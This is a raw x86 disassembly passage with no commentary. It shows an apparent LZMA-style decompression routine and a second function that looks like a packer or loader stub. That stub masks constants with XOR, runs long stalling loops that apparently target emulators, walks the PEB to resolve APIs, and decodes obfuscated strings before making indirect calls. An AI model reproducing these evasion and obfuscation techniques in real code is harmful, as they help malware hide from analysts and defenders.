  41b089:	push   DWORD PTR [ecx]
  41b08b:	mov    eax,DWORD PTR [eax+0x1d8]
  41b091:	call   DWORD PTR [eax+0x28]
  41b094:	jmp    0x41b0a0
  41b096:	mov    eax,DWORD PTR [eax+0x17c]
  41b09c:	mov    eax,DWORD PTR [eax]
  41b09e:	add    DWORD PTR [edi],eax
  41b0a0:	pop    esi
  41b0a1:	pop    edi
  41b0a2:	pop    ebx
  41b0a3:	leave  
  41b0a4:	ret    0x20
  41b0a7:	push   edi
  41b0a8:	push   esi
  41b0a9:	push   ebx
  41b0aa:	push   ebp
  41b0ab:	mov    ebp,esp
  41b0ad:	mov    eax,DWORD PTR [ebp+0x24]
  41b0b0:	add    DWORD PTR [ebp+0x28],eax
  41b0b3:	push   eax
  41b0b4:	cld    
  41b0b5:	mov    esi,DWORD PTR [ebp+0x18]
  41b0b8:	add    DWORD PTR [ebp+0x1c],esi
  41b0bb:	push   esi
  41b0bc:	mov    esi,DWORD PTR [ebp+0x14]
  41b0bf:	lods   eax,DWORD PTR ds:[esi]
  41b0c0:	xchg   edx,eax
  41b0c1:	push   edx
  41b0c2:	mov    cl,BYTE PTR [esi-0x2]
  41b0c5:	or     eax,0xffffffff
  41b0c8:	shl    eax,cl
  41b0ca:	not    eax
  41b0cc:	push   eax
  41b0cd:	mov    cl,dh
  41b0cf:	or     eax,0xffffffff
  41b0d2:	shl    eax,cl
  41b0d4:	not    eax
  41b0d6:	push   eax
  41b0d7:	add    cl,dl
  41b0d9:	mov    edi,esi
  41b0db:	sub    esp,0xc
  41b0de:	sub    eax,eax
  41b0e0:	inc    eax
  41b0e1:	push   eax
  41b0e2:	push   eax
  41b0e3:	push   eax
  41b0e4:	push   eax
  41b0e5:	push   eax
  41b0e6:	push   edi
  41b0e7:	sub    esi,esi
  41b0e9:	push   esi
  41b0ea:	or     ebx,0xffffffff
  41b0ed:	mov    eax,0x300
  41b0f2:	shl    eax,cl
  41b0f4:	lea    ecx,[eax+0x736]
  41b0fa:	mov    eax,0x4000400
  41b0ff:	shr    ecx,1
  41b101:	rep stos DWORD PTR es:[edi],eax
  41b103:	push   0x5
  41b105:	pop    ecx
  41b106:	call   0x41b3f1
  41b10b:	loop   0x41b106
  41b10d:	lea    esi,[esi]
  41b10f:	lea    edi,[edi]
  41b111:	mov    edi,DWORD PTR [ebp-0x4]
  41b114:	mov    eax,DWORD PTR [ebp-0x10]
  41b117:	sub    edi,DWORD PTR [ebp+0x24]
  41b11a:	and    eax,edi
  41b11c:	mov    DWORD PTR [ebp-0x18],eax
  41b11f:	mov    al,0x0
  41b121:	call   0x41b409
  41b126:	jne    0x41b1c1
  41b12c:	mov    cl,BYTE PTR [ebp-0xc]
  41b12f:	and    edi,DWORD PTR [ebp-0x14]
  41b132:	shl    edi,cl
  41b134:	sub    cl,0x8
  41b137:	neg    cl
  41b139:	shr    esi,cl
  41b13b:	pop    eax
  41b13c:	add    edi,esi
  41b13e:	pop    esi
  41b13f:	lea    edi,[edi+edi*2]
  41b142:	shl    edi,0x8
  41b145:	cmp    al,0x7
  41b147:	pop    edx
  41b148:	lea    ecx,[esi+edi*2+0xe6c]
  41b14f:	push   ecx
  41b150:	push   esi
  41b151:	mov    esi,0x100
  41b156:	push   eax
  41b157:	mov    al,0x1
  41b159:	jb     0x41b18f
  41b15b:	mov    edi,DWORD PTR [ebp-0x4]
  41b15e:	sub    edi,DWORD PTR [ebp-0x24]
  41b161:	movzx  edi,BYTE PTR [edi]
  41b164:	mov    ebp,DWORD PTR [ebp-0x34]
  41b167:	shl    edi,1
  41b169:	mov    ecx,esi
  41b16b:	and    esi,edi
  41b16d:	add    ecx,esi
  41b16f:	lea    ebp,[ebp+ecx*2+0x0]
  41b173:	call   0x41b428
  41b178:	mov    ecx,eax
  41b17a:	shr    esi,0x8
  41b17d:	and    ecx,0x1
  41b180:	cmp    esi,ecx
  41b182:	mov    esi,0x100
  41b187:	jne    0x41b197
  41b189:	cmp    eax,esi
  41b18b:	jb     0x41b164
  41b18d:	jmp    0x41b1a3
  41b18f:	mov    ebp,DWORD PTR [ebp-0x34]
  41b192:	call   0x41b428
  41b197:	inc    eax
  41b198:	inc    esi
  41b199:	sub    eax,0x1
  41b19c:	sub    esi,0x1
  41b19f:	cmp    eax,esi
  41b1a1:	jb     0x41b18f
  41b1a3:	pop    edx
  41b1a4:	inc    edx
  41b1a5:	cmp    edx,0x5
  41b1a8:	dec    edx
  41b1a9:	mov    ecx,edx
  41b1ab:	jb     0x41b1bc
  41b1ad:	inc    edx
  41b1ae:	cmp    edx,0xb
  41b1b1:	dec    edx
  41b1b2:	mov    cl,0x4
  41b1b4:	dec    cl
  41b1b6:	jb     0x41b1bc
  41b1b8:	mov    cl,0x7
  41b1ba:	dec    cl
  41b1bc:	sub    edx,ecx
  41b1be:	push   edx
  41b1bf:	jmp    0x41b210
  41b1c1:	mov    al,0xc1
  41b1c3:	dec    al
  41b1c5:	call   0x41b419
  41b1ca:	jne    0x41b1e0
  41b1cc:	pop    eax
  41b1cd:	pop    edi
  41b1ce:	pop    edx
  41b1cf:	pop    ecx
  41b1d0:	pop    edx
  41b1d1:	pop    ecx
  41b1d2:	push   DWORD PTR [esp]
  41b1d5:	push   ecx
  41b1d6:	push   edx
  41b1d7:	mov    edx,0x664
  41b1dc:	mov    cl,0x0
  41b1de:	jmp    0x41b253
  41b1e0:	mov    al,0xcd
  41b1e2:	dec    al
  41b1e4:	call   0x41b419
  41b1e9:	jne    0x41b219
  41b1eb:	mov    al,0xf1
  41b1ed:	dec    al
  41b1ef:	call   0x41b409
  41b1f4:	jne    0x41b249
  41b1f6:	pop    eax
  41b1f7:	cmp    al,0x7
  41b1f9:	mov    al,0x9
  41b1fb:	jb     0x41b1ff
  41b1fd:	mov    al,0xb
  41b1ff:	push   eax
  41b200:	mov    esi,DWORD PTR [ebp-0x4]
  41b203:	sub    esi,DWORD PTR [ebp-0x24]
  41b206:	cmp    esi,DWORD PTR [ebp+0x24]
  41b209:	jb     0x41b3e0
  41b20f:	lods   al,BYTE PTR ds:[esi]
  41b210:	mov    edi,DWORD PTR [ebp-0x4]
  41b213:	stos   BYTE PTR es:[edi],al
  41b214:	jmp    0x41b3a7
  41b219:	mov    al,0xd8
  41b21b:	call   0x41b419
  41b220:	mov    esi,DWORD PTR [ebp-0x28]
  41b223:	je     0x41b240
  41b225:	mov    al,0xe4
  41b227:	call   0x41b419
  41b22c:	mov    esi,DWORD PTR [ebp-0x2c]
  41b22f:	je     0x41b23a
  41b231:	mov    esi,DWORD PTR [ebp-0x30]
  41b234:	mov    ecx,DWORD PTR [ebp-0x2c]
  41b237:	mov    DWORD PTR [ebp-0x30],ecx
  41b23a:	mov    ecx,DWORD PTR [ebp-0x28]
  41b23d:	mov    DWORD PTR [ebp-0x2c],ecx
  41b240:	mov    ecx,DWORD PTR [ebp-0x24]
  41b243:	mov    DWORD PTR [ebp-0x28],ecx
  41b246:	mov    DWORD PTR [ebp-0x24],esi
  41b249:	pop    eax
  41b24a:	pop    edi
  41b24b:	pop    ecx
  41b24c:	mov    edx,0xa68
  41b251:	mov    cl,0x8
  41b253:	add    edx,edi
  41b255:	push   edx
  41b256:	push   edi
  41b257:	cmp    al,0x7
  41b259:	mov    al,cl
  41b25b:	jb     0x41b25f
  41b25d:	add    al,0x3
  41b25f:	push   eax
  41b260:	mov    ebp,DWORD PTR [ebp-0x34]
  41b263:	call   0x41b426
  41b268:	jne    0x41b27e
  41b26a:	mov    eax,DWORD PTR [ebp-0x18]
  41b26d:	mov    edi,DWORD PTR [ebp-0x34]
  41b270:	shl    eax,0x3
  41b273:	sub    ecx,ecx
  41b275:	push   0x8
  41b277:	pop    esi
  41b278:	lea    edi,[edi+eax*2+0x4]
  41b27c:	jmp    0x41b2b3
  41b27e:	mov    ebp,DWORD PTR [ebp-0x34]
  41b281:	add    ebp,0x2
  41b284:	call   0x41b426
  41b289:	jne    0x41b2a3
  41b28b:	mov    eax,DWORD PTR [ebp-0x18]
  41b28e:	mov    edi,DWORD PTR [ebp-0x34]
  41b291:	shl    eax,0x3
  41b294:	push   0x8
  41b296:	pop    ecx
  41b297:	push   0x8
  41b299:	pop    esi
  41b29a:	lea    edi,[edi+eax*2+0x104]
  41b2a1:	jmp    0x41b2b3
  41b2a3:	mov    edi,0x204
  41b2a8:	add    edi,DWORD PTR [ebp-0x34]
  41b2ab:	push   0x10
  41b2ad:	pop    ecx
  41b2ae:	mov    esi,0x100
  41b2b3:	mov    DWORD PTR [ebp-0x1c],ecx
  41b2b6:	sub    eax,eax
  41b2b8:	inc    eax
  41b2b9:	mov    ebp,edi
  41b2bb:	call   0x41b428
  41b2c0:	mov    ecx,eax
  41b2c2:	sub    ecx,esi
  41b2c4:	jb     0x41b2b9
  41b2c6:	add    DWORD PTR [ebp-0x1c],ecx
  41b2c9:	cmp    DWORD PTR [ebp-0x3c],0x4
  41b2cd:	jae    0x41b383
  41b2d3:	add    DWORD PTR [ebp-0x3c],0x7
  41b2d7:	mov    ecx,DWORD PTR [ebp-0x1c]
  41b2da:	cmp    ecx,0x4
  41b2dd:	jb     0x41b2e2
  41b2df:	push   0x3
  41b2e1:	pop    ecx
  41b2e2:	mov    edi,DWORD PTR [ebp-0x38]
  41b2e5:	shl    ecx,0x6
  41b2e8:	sub    eax,eax
  41b2ea:	inc    eax
  41b2eb:	push   0x40
  41b2ed:	pop    esi
  41b2ee:	lea    edi,[edi+ecx*2+0x360]
  41b2f5:	mov    ebp,edi
  41b2f7:	call   0x41b428
  41b2fc:	mov    ecx,eax
  41b2fe:	sub    ecx,esi
  41b300:	jb     0x41b2f5
  41b302:	mov    DWORD PTR [ebp-0x18],ecx
  41b305:	mov    DWORD PTR [ebp-0x24],ecx
  41b308:	cmp    ecx,0x4
  41b30b:	jb     0x41b380
  41b30d:	mov    esi,ecx
  41b30f:	and    DWORD PTR [ebp-0x24],0x1
  41b313:	shr    esi,1
  41b315:	or     DWORD PTR [ebp-0x24],0x2
  41b319:	dec    esi
  41b31a:	cmp    ecx,0xe
  41b31d:	jae    0x41b338
  41b31f:	mov    eax,0x2af
  41b324:	sub    eax,ecx
  41b326:	mov    ecx,esi
  41b328:	shl    BYTE PTR [ebp-0x24],cl
  41b32b:	add    eax,DWORD PTR [ebp-0x24]
  41b32e:	shl    eax,1
  41b330:	add    eax,DWORD PTR [ebp-0x38]
  41b333:	mov    DWORD PTR [ebp-0x34],eax
  41b336:	jmp    0x41b365
  41b338:	sub    esi,0x4
  41b33b:	call   0x41b3e5
  41b340:	shr    ebx,1
  41b342:	shl    DWORD PTR [ebp-0x24],1
  41b345:	cmp    DWORD PTR [ebp-0x20],ebx
  41b348:	jb     0x41b350
  41b34a:	inc    DWORD PTR [ebp-0x24]
  41b34d:	sub    DWORD PTR [ebp-0x20],ebx
  41b350:	dec    esi
  41b351:	jne    0x41b33b
  41b353:	mov    eax,0x644
  41b358:	add    eax,DWORD PTR [ebp-0x38]
  41b35b:	mov    DWORD PTR [ebp-0x34],eax
  41b35e:	shl    DWORD PTR [ebp-0x24],0x4
  41b362:	push   0x4
  41b364:	pop    esi
  41b365:	sub    edi,edi
  41b367:	inc    edi
  41b368:	mov    eax,edi
  41b36a:	mov    ebp,DWORD PTR [ebp-0x34]
  41b36d:	call   0x41b428
  41b372:	test   al,0x1
  41b374:	je     0x41b379
  41b376:	or     DWORD PTR [ebp-0x24],edi
  41b379:	shl    edi,1
  41b37b:	dec    esi
  41b37c:	jne    0x41b36a
  41b37e:	jmp    0x41b380
  41b380:	inc    DWORD PTR [ebp-0x24]
  41b383:	mov    ecx,DWORD PTR [ebp-0x1c]
  41b386:	add    ecx,0x2
  41b389:	mov    edi,DWORD PTR [ebp-0x4]
  41b38c:	mov    eax,edi
  41b38e:	sub    eax,DWORD PTR [ebp+0x24]
  41b391:	cmp    DWORD PTR [ebp-0x24],eax
  41b394:	ja     0x41b3e0
  41b396:	mov    esi,edi
  41b398:	sub    esi,DWORD PTR [ebp-0x24]
  41b39b:	mov    edx,DWORD PTR [ebp+0x28]
  41b39e:	lods   al,BYTE PTR ds:[esi]
  41b39f:	stos   BYTE PTR es:[edi],al
  41b3a0:	cmp    edi,edx
  41b3a2:	jae    0x41b3a7
  41b3a4:	dec    ecx
  41b3a5:	jne    0x41b39e
  41b3a7:	mov    DWORD PTR [ebp-0x4],edi
  41b3aa:	movzx  esi,al
  41b3ad:	cmp    edi,DWORD PTR [ebp+0x28]
  41b3b0:	jb     0x41b111
  41b3b6:	call   0x41b3e5
  41b3bb:	sub    eax,eax
  41b3bd:	lea    ebp,[esp+0x3c]
  41b3c1:	mov    edx,DWORD PTR [ebp+0x20]
  41b3c4:	mov    esi,DWORD PTR [ebp-0x8]
  41b3c7:	sub    esi,DWORD PTR [ebp+0x18]
  41b3ca:	mov    DWORD PTR [edx],esi
  41b3cc:	mov    edx,DWORD PTR [ebp+0x2c]
  41b3cf:	mov    edi,DWORD PTR [ebp-0x4]
  41b3d2:	sub    edi,DWORD PTR [ebp+0x24]
  41b3d5:	mov    DWORD PTR [edx],edi
  41b3d7:	leave  
  41b3d8:	pop    ebx
  41b3d9:	pop    esi
  41b3da:	pop    edi
  41b3db:	ret    0x1c
  41b3de:	pop    esi
  41b3df:	pop    eax
  41b3e0:	sub    eax,eax
  41b3e2:	inc    eax
  41b3e3:	jmp    0x41b3bd
  41b3e5:	cmp    ebx,0x1000000
  41b3eb:	jb     0x41b3ee
  41b3ed:	ret    
  41b3ee:	shl    ebx,0x8
  41b3f1:	push   esi
  41b3f2:	mov    esi,DWORD PTR [ebp-0x8]
  41b3f5:	cmp    esi,DWORD PTR [ebp+0x1c]
  41b3f8:	jae    0x41b3de
  41b3fa:	mov    eax,DWORD PTR [ebp-0x20]
  41b3fd:	shl    eax,0x8
  41b400:	lods   al,BYTE PTR ds:[esi]
  41b401:	mov    DWORD PTR [ebp-0x20],eax
  41b404:	mov    DWORD PTR [ebp-0x8],esi
  41b407:	pop    esi
  41b408:	ret    
  41b409:	mov    ecx,DWORD PTR [ebp-0x3c]
  41b40c:	movzx  eax,al
  41b40f:	shl    ecx,0x4
  41b412:	add    eax,DWORD PTR [ebp-0x18]
  41b415:	add    eax,ecx
  41b417:	jmp    0x41b41f
  41b419:	movzx  eax,al
  41b41c:	add    eax,DWORD PTR [ebp-0x3c]
  41b41f:	mov    ebp,DWORD PTR [ebp-0x38]
  41b422:	lea    ebp,[ebp+eax*2+0x0]
  41b426:	sub    eax,eax
  41b428:	lea    ebp,[ebp+eax*2+0x0]
  41b42c:	cmp    ebx,0x1000000
  41b432:	jae    0x41b450
  41b434:	mov    ecx,DWORD PTR [esp+0x38]
  41b438:	shl    DWORD PTR [esp+0x20],0x8
  41b43d:	cmp    ecx,DWORD PTR [esp+0x5c]
  41b441:	jae    0x41b3df
  41b443:	mov    dl,BYTE PTR [ecx]
  41b445:	inc    DWORD PTR [esp+0x38]
  41b449:	shl    ebx,0x8
  41b44c:	mov    BYTE PTR [esp+0x20],dl
  41b450:	mov    ecx,ebx
  41b452:	movzx  edx,WORD PTR [ebp+0x0]
  41b456:	shr    ecx,0xb
  41b459:	imul   ecx,edx
  41b45c:	cmp    DWORD PTR [esp+0x20],ecx
  41b460:	jae    0x41b479
  41b462:	mov    ebx,ecx
  41b464:	mov    ecx,0x800
  41b469:	sub    ecx,edx
  41b46b:	shr    ecx,0x5
  41b46e:	add    WORD PTR [ebp+0x0],cx
  41b472:	add    eax,eax
  41b474:	lea    ebp,[esp+0x40]
  41b478:	ret    
  41b479:	shr    edx,0x5
  41b47c:	sub    DWORD PTR [esp+0x20],ecx
  41b480:	sub    ebx,ecx
  41b482:	sub    WORD PTR [ebp+0x0],dx
  41b486:	add    eax,eax
  41b488:	add    eax,0x1
  41b48b:	lea    ebp,[esp+0x40]
  41b48f:	ret    
  41b490:	push   ebp
  41b491:	mov    ebp,esp
  41b493:	sub    esp,0x104
  41b499:	push   ebx
  41b49a:	push   esi
  41b49b:	push   edi
  41b49c:	mov    DWORD PTR [ebp-0x14],0xf89c85b9
  41b4a3:	mov    DWORD PTR [ebp-0x18],0xf89c85b8
  41b4aa:	mov    eax,DWORD PTR [ebp+0x8]
  41b4ad:	mov    DWORD PTR [ebp+0x8],eax
  41b4b0:	mov    ecx,DWORD PTR [ebp-0x14]
  41b4b3:	mov    ebx,0x7510899
  41b4b8:	xor    ecx,ebx
  41b4ba:	mov    eax,0x3272e0
  41b4bf:	add    ecx,eax
  41b4c1:	mov    DWORD PTR [ebp-0x28],ecx
  41b4c4:	mov    ecx,DWORD PTR [ebp-0x14]
  41b4c7:	xor    ecx,ebx
  41b4c9:	add    ecx,eax
  41b4cb:	mov    DWORD PTR [ebp-0x40],ecx
  41b4ce:	mov    ecx,DWORD PTR [ebp-0x14]
  41b4d1:	xor    ecx,ebx
  41b4d3:	add    ecx,eax
  41b4d5:	mov    DWORD PTR [ebp-0x3c],ecx
  41b4d8:	mov    ecx,DWORD PTR [ebp-0x14]
  41b4db:	xor    ecx,ebx
  41b4dd:	add    ecx,eax
  41b4df:	mov    DWORD PTR [ebp-0xa0],ecx
  41b4e5:	mov    DWORD PTR [ebp-0x50],0xf89f05b9
  41b4ec:	mov    DWORD PTR [ebp-0x3c],0xf89cb5b9
  41b4f3:	mov    DWORD PTR [ebp-0x4c],0xf89c85bd
  41b4fa:	push   0x25
  41b4fc:	pop    ecx
  41b4fd:	mov    DWORD PTR [ebp-0x2c],ecx
  41b500:	mov    DWORD PTR [ebp-0x2c],ecx
  41b503:	push   0x65
  41b505:	pop    ecx
  41b506:	mov    DWORD PTR [ebp-0x2c],ecx
  41b509:	mov    DWORD PTR [ebp-0x2c],ecx
  41b50c:	mov    DWORD PTR [ebp-0x2c],0x4d
  41b513:	mov    DWORD PTR [ebp-0x2c],0x43
  41b51a:	mov    ecx,DWORD PTR [ebp-0x14]
  41b51d:	xor    ecx,ebx
  41b51f:	add    ecx,eax
  41b521:	mov    DWORD PTR [ebp-0x2c],ecx
  41b524:	mov    ecx,DWORD PTR [ebp-0x14]
  41b527:	xor    ecx,ebx
  41b529:	add    ecx,eax
  41b52b:	mov    DWORD PTR [ebp-0x2c],ecx
  41b52e:	mov    DWORD PTR [ebp-0x24],0x257
  41b535:	mov    DWORD PTR [ebp-0x34],0x35
  41b53c:	mov    DWORD PTR [ebp-0x10],0x79
  41b543:	lea    edi,[ebp-0xe4]
  41b549:	lea    esi,[ebp-0x104]
  41b54f:	call   0x41c169
  41b554:	dec    DWORD PTR [ebp-0x10]
  41b557:	jne    0x41b543
  41b559:	dec    DWORD PTR [ebp-0x34]
  41b55c:	jne    0x41b53c
  41b55e:	dec    DWORD PTR [ebp-0x24]
  41b561:	jne    0x41b535
  41b563:	mov    DWORD PTR [ebp-0x24],0x400d
  41b56a:	mov    eax,DWORD PTR [ebp-0x14]
  41b56d:	xor    eax,ebx
  41b56f:	mov    esi,0x3272e0
  41b574:	add    eax,esi
  41b576:	mov    DWORD PTR [ebp-0x8],eax
  41b579:	mov    eax,DWORD PTR [ebp-0x14]
  41b57c:	and    DWORD PTR [ebp-0x94],0x0
  41b583:	xor    eax,ebx
  41b585:	add    eax,esi
  41b587:	mov    DWORD PTR [ebp-0x38],eax
  41b58a:	mov    eax,fs:0x18
  41b590:	mov    DWORD PTR [ebp-0x94],eax
  41b596:	mov    eax,DWORD PTR [eax+0x30]
  41b599:	mov    DWORD PTR [ebp-0x98],eax
  41b59f:	mov    eax,DWORD PTR [eax+0xc]
  41b5a2:	mov    DWORD PTR [ebp-0xc0],eax
  41b5a8:	mov    eax,DWORD PTR [ebp+0x8]
  41b5ab:	lea    ecx,[ebp-0x94]
  41b5b1:	mov    DWORD PTR [eax+0x1a0],ecx
  41b5b7:	mov    eax,DWORD PTR [ebp+0x8]
  41b5ba:	lea    ecx,[ebp-0x98]
  41b5c0:	mov    DWORD PTR [eax+0x1a4],ecx
  41b5c6:	mov    eax,DWORD PTR [ebp+0x8]
  41b5c9:	push   DWORD PTR [ebp+0x8]
  41b5cc:	lea    ecx,[ebp-0xc0]
  41b5d2:	mov    DWORD PTR [eax+0x1a8],ecx
  41b5d8:	call   0x41d94f
  41b5dd:	mov    ecx,DWORD PTR [ebp-0x14]
  41b5e0:	xor    ecx,ebx
  41b5e2:	add    ecx,esi
  41b5e4:	cmp    ecx,eax
  41b5e6:	je     0x41b8c3
  41b5ec:	mov    eax,DWORD PTR [ebp+0x8]
  41b5ef:	mov    eax,DWORD PTR [eax+0x194]
  41b5f5:	mov    ecx,DWORD PTR [eax]
  41b5f7:	mov    eax,DWORD PTR [ebp+0x8]
  41b5fa:	mov    eax,DWORD PTR [eax+0x194]
  41b600:	mov    eax,DWORD PTR [eax]
  41b602:	add    eax,DWORD PTR [ecx+0x3c]
  41b605:	mov    ecx,DWORD PTR [ebp+0x8]
  41b608:	mov    ecx,DWORD PTR [ecx+0x1d8]
  41b60e:	lea    edx,[ebp-0xc4]
  41b614:	push   edx
  41b615:	mov    edx,DWORD PTR [ebp+0x8]
  41b618:	mov    edx,DWORD PTR [edx+0x18c]
  41b61e:	mov    edx,DWORD PTR [edx]
  41b620:	add    edx,DWORD PTR [eax+0x88]
  41b626:	push   0x4
  41b628:	push   DWORD PTR [eax+0x8c]
  41b62e:	push   edx
  41b62f:	call   DWORD PTR [ecx+0x1c]
  41b632:	push   DWORD PTR [ebp+0x8]
  41b635:	mov    edi,DWORD PTR [ebp+0x8]
  41b638:	mov    eax,DWORD PTR [ebp+0x8]
  41b63b:	mov    edx,DWORD PTR [eax+0x1b8]
  41b641:	mov    DWORD PTR [ebp-0x68],0x80e0f06
  41b648:	mov    DWORD PTR [ebp-0x64],0x10a051f
  41b64f:	mov    WORD PTR [ebp-0x60],0x7a39
  41b655:	mov    DWORD PTR [ebp-0x90],0x23f0f21
  41b65f:	mov    DWORD PTR [ebp-0x8c],0x6390819
  41b669:	mov    DWORD PTR [ebp-0x88],0x2419020a
  41b673:	mov    DWORD PTR [ebp-0x84],0x81d050d
  41b67d:	mov    DWORD PTR [ebp-0x80],0x7a391f01
  41b684:	mov    DWORD PTR [ebp-0x7c],0x23f0f21
  41b68b:	mov    DWORD PTR [ebp-0x78],0x6390819
  41b692:	mov    DWORD PTR [ebp-0x74],0x2419020a
  41b699:	mov    DWORD PTR [ebp-0x70],0x81d050d
  41b6a0:	mov    DWORD PTR [ebp-0x6c],0x7a131f01
  41b6a7:	call   0x41d97e
  41b6ac:	push   eax
  41b6ad:	mov    eax,DWORD PTR [ebp+0x8]
  41b6b0:	mov    eax,DWORD PTR [eax+0x1a8]
  41b6b6:	push   DWORD PTR [eax]
  41b6b8:	call   0x41d61f
  41b6bd:	test   eax,eax
  41b6bf:	jne    0x41b711
  41b6c1:	mov    eax,DWORD PTR [ebp+0x8]
  41b6c4:	mov    eax,DWORD PTR [eax+0x1d8]
  41b6ca:	mov    edi,DWORD PTR [ebp+0x8]
  41b6cd:	add    eax,0x4
  41b6d0:	mov    DWORD PTR [ebp-0x20],eax
  41b6d3:	mov    eax,DWORD PTR [ebp+0x8]
  41b6d6:	mov    edx,DWORD PTR [eax+0x1b8]
  41b6dc:	call   0x41d97e
  41b6e1:	push   eax
  41b6e2:	mov    eax,DWORD PTR [ebp-0x20]
  41b6e5:	call   DWORD PTR [eax]
  41b6e7:	test   eax,eax
  41b6e9:	jne    0x41b711
  41b6eb:	mov    eax,DWORD PTR [ebp+0x8]
  41b6ee:	mov    eax,DWORD PTR [eax+0x1d8]
  41b6f4:	mov    edi,DWORD PTR [ebp+0x8]
  41b6f7:	add    eax,0x10
  41b6fa:	mov    DWORD PTR [ebp-0x20],eax
  41b6fd:	mov    eax,DWORD PTR [ebp+0x8]
  41b700:	mov    edx,DWORD PTR [eax+0x1b8]
  41b706:	call   0x41d97e
  41b70b:	push   eax
  41b70c:	mov    eax,DWORD PTR [ebp-0x20]
  41b70f:	call   DWORD PTR [eax]
  41b711:	mov    eax,DWORD PTR [ebp-0x14]
  41b714:	mov    ecx,DWORD PTR [ebp-0x24]
  41b717:	xor    eax,ebx
  41b719:	add    eax,esi
  41b71b:	cmp    eax,ecx
  41b71d:	je     0x41b89c
  41b723:	mov    eax,DWORD PTR [ebp-0x18]
  41b726:	xor    eax,ebx
  41b728:	mov    ecx,0xffcd8d20
  41b72d:	sub    ecx,eax
  41b72f:	add    ecx,DWORD PTR [ebp-0x24]
  41b732:	mov    eax,DWORD PTR [ebp-0x8]
  41b735:	cmp    eax,ecx
  41b737:	ja     0x41b89c
  41b73d:	mov    DWORD PTR [ebp-0x34],0x0
  41b744:	push   DWORD PTR [ebp+0x8]
  41b747:	mov    edi,DWORD PTR [ebp+0x8]
  41b74a:	mov    eax,DWORD PTR [ebp+0x8]
  41b74d:	mov    edx,DWORD PTR [eax+0x1b4]
  41b753:	call   0x41d97e
  41b758:	push   eax
  41b759:	mov    eax,DWORD PTR [ebp+0x8]
  41b75c:	mov    eax,DWORD PTR [eax+0x1a8]
  41b762:	push   DWORD PTR [eax]
  41b764:	call   0x41d61f
  41b769:	mov    ecx,DWORD PTR [ebp+0x8]
  41b76c:	mov    ecx,DWORD PTR [ecx+0x19c]
  41b772:	mov    DWORD PTR [ecx],eax
  41b774:	mov    eax,DWORD PTR [ebp+0x8]
  41b777:	mov    edi,DWORD PTR [eax+0x1d8]
  41b77d:	mov    esi,DWORD PTR [ebp+0x8]
  41b780:	xor    eax,eax
  41b782:	lea    edx,[ebp-0x7c]
  41b785:	call   0x41d9b4
  41b78a:	push   eax
  41b78b:	mov    eax,DWORD PTR [ebp+0x8]
  41b78e:	mov    eax,DWORD PTR [eax+0x19c]
  41b794:	push   DWORD PTR [eax]
  41b796:	call   DWORD PTR [edi+0x8]
  41b799:	mov    DWORD PTR [ebp-0x20],eax
  41b79c:	mov    eax,DWORD PTR [ebp+0x8]
  41b79f:	mov    edi,DWORD PTR [eax+0x1d8]
  41b7a5:	mov    esi,DWORD PTR [ebp+0x8]
  41b7a8:	xor    eax,eax
  41b7aa:	lea    edx,[ebp-0x90]
  41b7b0:	call   0x41d9b4
  41b7b5:	push   eax
  41b7b6:	mov    eax,DWORD PTR [ebp+0x8]
  41b7b9:	mov    eax,DWORD PTR [eax+0x19c]
  41b7bf:	push   DWORD PTR [eax]
  41b7c1:	call   DWORD PTR [edi+0x8]
  41b7c4:	and    DWORD PTR [ebp-0x1c],0x0
  41b7c8:	mov    eax,DWORD PTR [ebp-0x1c]
  41b7cb:	and    eax,0x7
  41b7ce:	add    eax,0x31
  41b7d1:	push   eax
  41b7d2:	call   DWORD PTR [ebp-0x20]
  41b7d5:	test   eax,eax
  41b7d7:	jne    0x41b7de
  41b7d9:	and    DWORD PTR [ebp-0x10],eax
  41b7dc:	jmp    0x41b806
  41b7de:	mov    eax,DWORD PTR [ebp+0x8]
  41b7e1:	mov    edi,DWORD PTR [eax+0x1d8]
  41b7e7:	mov    esi,DWORD PTR [ebp+0x8]
  41b7ea:	xor    eax,eax
  41b7ec:	lea    edx,[ebp-0x68]
  41b7ef:	call   0x41d9b4
  41b7f4:	push   eax
  41b7f5:	mov    eax,DWORD PTR [ebp+0x8]
  41b7f8:	mov    eax,DWORD PTR [eax+0x198]
  41b7fe:	push   DWORD PTR [eax]
  41b800:	call   DWORD PTR [edi+0x8]
  41b803:	mov    DWORD PTR [ebp-0x10],eax
  41b806:	inc    DWORD PTR [ebp-0x1c]
  41b809:	cmp    DWORD PTR [ebp-0x1c],0x10
  41b80d:	jb     0x41b7c8
  41b80f:	mov    eax,DWORD PTR [ebp-0x18]
  41b812:	mov    esi,DWORD PTR [ebp+0x8]
  41b815:	xor    eax,ebx
  41b817:	mov    edi,0x3272e0
  41b81c:	add    eax,edi
  41b81e:	lea    edx,[ebp-0xe4]
  41b824:	call   0x41d9b4
  41b829:	push   eax
  41b82a:	mov    eax,DWORD PTR [ebp-0x14]
  41b82d:	mov    esi,DWORD PTR [ebp+0x8]
  41b830:	xor    eax,ebx
  41b832:	add    eax,edi
  41b834:	lea    edx,[ebp-0x104]
  41b83a:	call   0x41d9b4
  41b83f:	push   eax
  41b840:	call   DWORD PTR [ebp-0x10]
  41b843:	mov    ecx,DWORD PTR [ebp-0x14]
  41b846:	xor    ecx,ebx
  41b848:	add    ecx,edi
  41b84a:	cmp    ecx,eax
  41b84c:	jne    0x41b855
  41b84e:	mov    DWORD PTR [ebp-0x34],0x1
  41b855:	mov    eax,DWORD PTR [ebp-0x18]
  41b858:	mov    ecx,DWORD PTR [ebp-0x8]
  41b85b:	xor    eax,ebx
  41b85d:	lea    eax,[eax+ecx*1+0x3272e0]
  41b864:	mov    DWORD PTR [ebp-0x8],eax
  41b867:	mov    eax,DWORD PTR [ebp-0x34]
  41b86a:	test   eax,eax
  41b86c:	je     0x41b880
  41b86e:	mov    eax,DWORD PTR [ebp-0x18]
  41b871:	mov    ecx,DWORD PTR [ebp-0x38]
  41b874:	xor    eax,ebx
  41b876:	lea    eax,[eax+ecx*1+0x3272e0]
  41b87d:	mov    DWORD PTR [ebp-0x38],eax
  41b880:	mov    eax,DWORD PTR [ebp-0x18]
  41b883:	xor    eax,ebx
  41b885:	mov    ecx,0xffcd8d20
  41b88a:	sub    ecx,eax
  41b88c:	add    ecx,DWORD PTR [ebp-0x24]
  41b88f:	mov    eax,DWORD PTR [ebp-0x8]
  41b892:	cmp    eax,ecx
  41b894:	jbe    0x41b73d
  41b89a:	mov    esi,edi
  41b89c:	mov    eax,DWORD PTR [ebp-0x38]
  41b89f:	mov    ecx,DWORD PTR [ebp-0x8]
  41b8a2:	cmp    ecx,eax
  41b8a4:	jne    0x41b8b7
  41b8a6:	push   DWORD PTR [ebp+0x8]
